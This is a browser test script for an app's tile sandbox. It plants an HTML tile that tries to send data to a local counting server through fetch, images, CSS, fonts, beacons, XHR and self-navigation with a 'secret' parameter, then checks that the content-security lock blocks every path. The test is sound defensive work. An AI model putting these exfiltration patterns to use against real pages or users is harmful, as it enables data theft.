// The tile sandbox in a real browser (docs/PLAN.md, Stage 7).
// Usage: node scripts/check-tiles.mjs [baseUrl]   (default http://localhost:3005)
//
//   1. The 8 existing tiles still work under the network lock (TILE_CSP in
//      lib/tiles/tileBridge.ts): each opens on the board, draws something, throws
//      nothing, logs no CSP refusal, and a Pulse.load/save round trip succeeds.
//      vee.html is not on the board (the Mentor tile opens the mentor), so it is
//      mounted the way the board mounts a tile.
//   2. A planted tile that calls fetch, loads external images, a stylesheet, a
//      font and a beacon, from before and after its own <head>, sends NOTHING.
//      Proved against a local server that counts every request it gets: the page
//      itself must reach it (positive control), the same tile without the lock
//      must reach it (the check can see a leak), the locked tile must not.
//   3. With CUSTOM=1, the same planted tile as a custom board tile (custom-*
//      lane), opened from the board like any other.
// Drives Playwright's installed Chromium over raw CDP. Exits 1 on any failure.
import { spawn } from 'node:child_process'
import { createServer } from 'node:http'
import { mkdtempSync, existsSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir, homedir } from 'node:os'
import { withBridge } from '../lib/tiles/tileBridge.ts'

const base = (process.argv[2] || 'http://localhost:3005').replace(/\/$/, '')
const chrome = join(homedir(), 'AppData/Local/ms-playwright/chromium-1243/chrome-win64/chrome.exe')
if (!existsSync(chrome)) throw new Error('Chromium not found at ' + chrome)
const BOARD_TILES = ['train', 'fuel', 'vitals', 'brand', 'peak', 'finance', 'walks']
const tileHtml = (id) => readFileSync(new URL(`../public/tiles/${id}.html`, import.meta.url), 'utf8')

let failures = 0
const ok = (cond, msg) => { console.log(`${cond ? 'ok  ' : 'FAIL'} ${msg}`); if (!cond) failures++ }

// ── the server a leak would reach ──
const EXFIL_PORT = 3018
const EX = `http://127.0.0.1:${EXFIL_PORT}`
const hits = []
const exfil = createServer((req, res) => {
  hits.push(req.url)
  res.writeHead(200, { 'access-control-allow-origin': '*', 'content-type': 'text/plain' })
  res.end('ok')
})
await new Promise((r, j) => { exfil.once('error', j); exfil.listen(EXFIL_PORT, '127.0.0.1', r) })
const hitsFor = (prefix) => hits.filter((u) => u.startsWith(prefix))

/** A tile that tries every way out it can, tagged so each request names itself. */
const planted = (tag) => `<script>fetch('${EX}/${tag}-early').catch(function(){})</script><!doctype html>
<html><head><title>planted</title>
<link rel="stylesheet" href="${EX}/${tag}-css">
<style>@font-face{font-family:x;src:url(${EX}/${tag}-font)} body{font-family:x;background:url(${EX}/${tag}-bg)}</style>
</head><body><h1>planted</h1>
<img src="${EX}/${tag}-img">
<script>
fetch('${EX}/${tag}-fetch').then(function(){document.body.dataset.fetch='sent'},function(){document.body.dataset.fetch='blocked'})
new Image().src = '${EX}/${tag}-img2'
try { navigator.sendBeacon('${EX}/${tag}-beacon', 'x') } catch (e) {}
try { var x = new XMLHttpRequest(); x.open('GET', '${EX}/${tag}-xhr'); x.send() } catch (e) {}
</script></body></html>`

const port = 9336
const proc = spawn(chrome, ['--headless=new', `--remote-debugging-port=${port}`, `--user-data-dir=${mkdtempSync(join(tmpdir(), 'pulse-tiles-'))}`, 'about:blank'], { stdio: 'ignore' })
let ws
try {
  let page
  for (let i = 0; i < 50 && !page; i++) {
    try { page = await (await fetch(`http://127.0.0.1:${port}/json/new?about:blank`, { method: 'PUT' })).json() } catch { await new Promise((r) => setTimeout(r, 200)) }
  }
  if (!page) throw new Error('Chromium did not open its debug port')
  ws = new WebSocket(page.webSocketDebuggerUrl)
  await new Promise((r, j) => { ws.onopen = r; ws.onerror = j })

  // One connection, flattened sessions: a sandboxed tile may run in its own
  // process (its own target), so every frame's console and contexts are collected.
  let id = 0
  const waiting = new Map()
  const events = []
  const contexts = [] // { sessionId, id, frameId }
  const logs = [] // { t, text }
  const send = (method, params = {}, sessionId) => new Promise((r, j) => { const i = ++id; waiting.set(i, { r, j }); ws.send(JSON.stringify({ id: i, method, params, ...(sessionId ? { sessionId } : {}) })) })
  const watch = (sessionId) => Promise.all([send('Runtime.enable', {}, sessionId), send('Log.enable', {}, sessionId), send('Runtime.runIfWaitingForDebugger', {}, sessionId).catch(() => {})])
  ws.onmessage = (m) => {
    const d = JSON.parse(m.data)
    if (d.id && waiting.has(d.id)) { const { r, j } = waiting.get(d.id); waiting.delete(d.id); d.error ? j(new Error(d.error.message)) : r(d.result); return }
    if (!d.method) return
    events.push(d.method)
    const p = d.params
    if (d.method === 'Target.attachedToTarget') void watch(p.sessionId)
    else if (d.method === 'Runtime.executionContextCreated') contexts.push({ sessionId: d.sessionId, id: p.context.id, frameId: p.context.auxData?.frameId, isDefault: p.context.auxData?.isDefault })
    else if (d.method === 'Log.entryAdded') logs.push({ t: Date.now(), text: p.entry.text })
    else if (d.method === 'Runtime.exceptionThrown') logs.push({ t: Date.now(), text: 'EXCEPTION ' + (p.exceptionDetails.exception?.description || p.exceptionDetails.text) })
    else if (d.method === 'Runtime.consoleAPICalled' && p.type === 'error') logs.push({ t: Date.now(), text: 'console.error ' + p.args.map((a) => a.value ?? a.description).join(' ') })
  }
  const evalIn = async (expression, contextId, sessionId) => {
    const res = await send('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true, ...(contextId ? { contextId } : {}) }, sessionId)
    if (res.exceptionDetails) throw new Error('script failed: ' + (res.exceptionDetails.exception?.description || res.exceptionDetails.text))
    return res.result.value
  }
  const js = (expression) => evalIn(expression)
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
  const waitFor = async (expr, what, ms = 20000) => {
    for (let t = 0; t < ms; t += 150) { if (await js(expr)) return; await sleep(150) }
    throw new Error('timed out waiting for ' + what)
  }
  const go = async (url) => {
    events.length = 0
    await send('Page.navigate', { url })
    for (let i = 0; i < 200 && !events.includes('Page.loadEventFired'); i++) await sleep(100)
    if (!events.includes('Page.loadEventFired')) throw new Error('page never loaded: ' + url)
  }
  /** The newest tile frame's main world (about:srcdoc with the bridge), created after `since`. */
  const tileContext = async (since, ms = 15000) => {
    for (let t = 0; t < ms; t += 200) {
      for (const c of contexts.slice(since).reverse()) {
        if (c.isDefault === false) continue
        try {
          if (await evalIn(`location.href === 'about:srcdoc' && typeof window.Pulse === 'object'`, c.id, c.sessionId)) return c
        } catch { /* context gone */ }
      }
      await sleep(200)
    }
    throw new Error('no tile frame with the bridge appeared')
  }
  const refusals = (since) => logs.filter((l) => l.t >= since && /Content Security Policy/.test(l.text))
  const problems = (since) => logs.filter((l) => l.t >= since && /EXCEPTION|console\.error|Content Security Policy/.test(l.text))

  await send('Page.enable')
  await watch()
  await send('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true })
  await send('Emulation.setDeviceMetricsOverride', { width: 1280, height: 900, deviceScaleFactor: 1, mobile: false })

  // The demo board, intro skipped: every slot with a public/tiles file is on it.
  await go(base + '/manifest.webmanifest')
  await js(`localStorage.clear(); localStorage.setItem('vitality:me:onboarded', 'skip'); true`)
  await go(base + '/app')
  await waitFor(`document.querySelectorAll('[data-slot]').length >= ${BOARD_TILES.length}`, 'the demo board with every tile')

  // ── 1. the 8 existing tiles under the lock ──
  for (const tile of BOARD_TILES) {
    const t0 = Date.now()
    const since = contexts.length
    await js(`document.querySelector('[data-slot="${tile}"] button[aria-label^="Open"]').click(); true`)
    await waitFor(`!!document.querySelector('[role=dialog] iframe')`, `the ${tile} overlay`)
    const c = await tileContext(since)
    await sleep(1200) // let the tile finish drawing and log anything it would
    const r = await evalIn(`(async () => {
      const d = await Pulse.load()
      const saved = await Pulse.save(d)
      const csp = document.querySelector('meta[http-equiv="Content-Security-Policy"]')
      return { saved, text: document.body.innerText.trim().length, kids: document.body.querySelectorAll('*').length, csp: !!csp && csp.parentElement.tagName, firstInHead: document.head.firstElementChild === csp }
    })()`, c.id, c.sessionId)
    const bad = problems(t0)
    ok(r.saved === true && r.text > 0 && r.kids > 3 && r.csp === 'HEAD' && r.firstInHead && bad.length === 0,
      `${tile}: draws (${r.kids} elements), Pulse.load/save round trip ${r.saved}, CSP first in head, ${bad.length ? 'PROBLEMS: ' + bad.map((b) => b.text.slice(0, 120)).join(' | ') : 'no errors, no refusals'}`)
    await js(`document.querySelector('[role=dialog] button').click(); true`)
    await waitFor(`!document.querySelector('[role=dialog] iframe')`, `the ${tile} overlay to close`)
  }

  // vee.html: mounted exactly as the board mounts a tile (sandbox, bridged srcdoc).
  const mount = (html, idAttr) => js(`(() => { const f = document.createElement('iframe'); f.id = ${JSON.stringify(idAttr)}; f.sandbox = 'allow-scripts'; f.srcdoc = ${JSON.stringify(html)}; f.style.cssText = 'width:600px;height:400px'; document.body.appendChild(f); return true })()`)
  {
    const t0 = Date.now()
    const since = contexts.length
    await mount(withBridge(tileHtml('vee')), 'vee-frame')
    const c = await tileContext(since)
    await sleep(1200)
    const r = await evalIn(`({ kids: document.body.querySelectorAll('*').length, text: document.body.innerText.trim().length })`, c.id, c.sessionId)
    const bad = problems(t0)
    ok(r.kids > 3 && bad.length === 0, `vee: draws (${r.kids} elements), ${bad.length ? 'PROBLEMS: ' + bad.map((b) => b.text.slice(0, 120)).join(' | ') : 'no errors, no refusals'}`)
  }

  // ── 2. the planted tile ──
  await js(`fetch('${EX}/control', { mode: 'no-cors' }).then(() => true)`)
  await sleep(300)
  ok(hitsFor('/control').length === 1, `positive control: the page itself reaches the counting server (${hitsFor('/control').length} hit)`)

  await mount(planted('raw'), 'raw-frame')
  await sleep(2500)
  ok(hitsFor('/raw-').length >= 4, `negative control: the same tile WITHOUT the lock leaks (${[...new Set(hitsFor('/raw-'))].join(', ')})`)

  const t1 = Date.now()
  const since = contexts.length
  await mount(withBridge(planted('locked')), 'locked-frame')
  const c = await tileContext(since)
  await sleep(2500)
  const fetchState = await evalIn(`document.body.dataset.fetch || 'pending'`, c.id, c.sessionId)
  ok(hitsFor('/locked-').length === 0, `the locked planted tile sent nothing (${hitsFor('/locked-').length} requests: ${hitsFor('/locked-').join(', ') || 'none'})`)
  ok(fetchState === 'blocked', `its fetch() rejected inside the tile (${fetchState})`)
  const refused = refusals(t1).map((l) => l.text)
  const missing = ['fetch', 'img', 'css', 'font', 'early'].filter((p) => !refused.some((t) => t.includes(`/locked-${p}`)))
  ok(!missing.length, `the console shows the CSP refusing the fetch, image, stylesheet, font and the script before <head> (${refused.length} refusals; missing: ${missing.join(', ') || 'none'})`)
  for (const t of refused.slice(0, 3)) console.log('     ' + t.slice(0, 150))

  // Navigating itself is the one way out a CSP meta cannot close (it governs
  // what a document loads, not where its frame goes). The board page's own
  // header (frame-src in next.config.mjs) closes it: a frame of /app may only
  // show the board's own pages.
  const navs = [
    ['nav-js', `<script>location.href = '${EX}/nav-js?d=secret'</script>`],
    ['nav-meta', `<meta http-equiv="refresh" content="0;url=${EX}/nav-meta?d=secret">`],
    ['nav-link', `<a id="a" href="${EX}/nav-link?d=secret">x</a><script>document.getElementById('a').click()</script>`],
  ]
  for (const [tag, body] of navs) await mount(withBridge(`<!doctype html><html><head></head><body>${body}</body></html>`), tag)
  await sleep(2500)
  ok(hitsFor('/nav-').length === 0, `a locked tile cannot navigate itself out either (${hitsFor('/nav-').join(', ') || 'none'})`)

  // ── 3. the same tile through the custom lane (after Stage 7's custom slots) ──
  if (process.env.CUSTOM) {
    await go(base + '/manifest.webmanifest')
    const now = Date.now()
    await js(`(() => {
      localStorage.setItem('vitality:me:tiles', JSON.stringify([{ id: 'custom-planted', name: 'Planted', html: ${JSON.stringify(planted('custom'))}, createdAt: ${now}, updatedAt: ${now} }]))
      return true })()`)
    await go(base + '/app')
    await waitFor(`!!document.querySelector('[data-slot="custom-planted"]')`, 'the planted custom tile on the board')
    const t2 = Date.now()
    const s2 = contexts.length
    await js(`document.querySelector('[data-slot="custom-planted"] button[aria-label^="Open"]').click(); true`)
    const c2 = await tileContext(s2)
    await sleep(2500)
    ok(hitsFor('/custom-').length === 0 && (await evalIn(`document.body.dataset.fetch`, c2.id, c2.sessionId)) === 'blocked', `as a custom board tile it sends nothing either (${hitsFor('/custom-').length} requests)`)
    ok(refusals(t2).length >= 4, `and the console shows the refusals (${refusals(t2).length})`)
  }
} finally {
  ws?.close()
  proc.kill()
  exfil.close()
}
console.log(failures ? `\n${failures} failed` : '\nall tile checks passed')
process.exitCode = failures ? 1 : 0
